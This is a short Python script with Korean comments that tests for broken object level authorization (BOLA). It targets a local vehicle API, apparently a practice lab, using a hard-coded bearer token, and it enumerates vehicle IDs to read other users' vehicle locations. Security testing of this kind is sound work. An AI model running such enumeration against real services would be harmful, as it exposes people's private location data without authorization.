#!/usr/bin/env python3
import requests

target = "http://localhost:8888"

# 여기에 토큰 붙여넣기
token = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJyZWR0ZWFtQGhhY2tlci5jb20iLCJpYXQiOjE3Nzc1Njg1NDksImV4cCI6MTc3ODE3MzM0OSwicm9sZSI6InVzZXIifQ.K_CL2EMNv6th2e5xIN0TBFxOJv1Vd1I7xCY2Q3kayW-nkcPacfJZtwi4o-tYLWGbCiakk1x38m0RAw--TlGzxfrYnZLT9RCSSYD4lm-R-z7KK-vrKWoCL6WBcx6Xl_vee6pfzMeZEBbHU11qTcG85JZpO-HdbemSibohHnYXB8lMoAD_1TrFQLCHy30aYoXSILQX26w1LCMsnVWx0V_mwuSm10vyJfUfs3uiuDN4qtbsx4KDQG9G7Wfb6iGfTnOuR90jZmdbNuJNugIBEgPIF1CyHd4UkmWrjmNfz6ufRW9NDCkHtY3ZQv-pTTzrBNTVZtyCZDHqHDh8tlHQUJsLOg"

headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}

print("="*60)
print("[*] BOLA Attack - Testing Object Level Authorization")
print("[*] Target: " + target)
print("="*60)

# 내 차량 정보
print("\n[+] Step 1: Getting my vehicles...")
r = requests.get(f"{target}/identity/api/v2/vehicle/vehicles", headers=headers)
print(f"  Status: {r.status_code}")
if r.status_code == 200:
    print(f"  My vehicles: {r.text}")

# 다른 사용자 차량 접근
print("\n[+] Step 2: Trying to access other users' vehicles...")
for vid in range(1, 10):
    r = requests.get(f"{target}/identity/api/v2/vehicle/{vid}/location", headers=headers)
    
    if r.status_code == 200:
        print(f"  [🔥] Vehicle {vid}: VULNERABLE! Unauthorized access!")
        print(f"       {r.text[:150]}")
    elif r.status_code == 403:
        print(f"  [✓] Vehicle {vid}: Properly protected")
    elif r.status_code == 404:
        print(f"  [-] Vehicle {vid}: Not found")

print("\n" + "="*60)
print("[*] BOLA Test Complete!")
print("="*60)
